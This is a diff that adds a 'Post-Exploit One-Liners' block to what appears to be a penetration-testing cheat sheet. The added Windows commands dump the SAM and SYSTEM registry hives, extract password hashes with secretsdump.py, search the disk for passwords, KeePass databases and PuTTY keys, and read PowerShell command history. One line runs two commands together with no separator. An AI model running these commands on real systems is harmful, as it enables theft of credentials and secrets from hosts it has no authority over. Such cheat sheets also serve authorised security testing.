@@ -114,7 +114,11 @@ cd ~/bloodhound
 
 ### Post-Exploit One-Liners
 ```bash
-
+reg save HKLM\SAM C:\Temp\sam && reg save HKLM\SYSTEM C:\Temp\system
+secretsdump.py -sam sam -system system LOCAL
+findstr /si password *.txt *.xml *.ini *.config 2>nul where /r C:\ *.kdbx *.ppk *.config 2>nul
+type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+gc (Get-PSReadlineOption).HistorySavePath 2>nul
 ```
 
 ### 
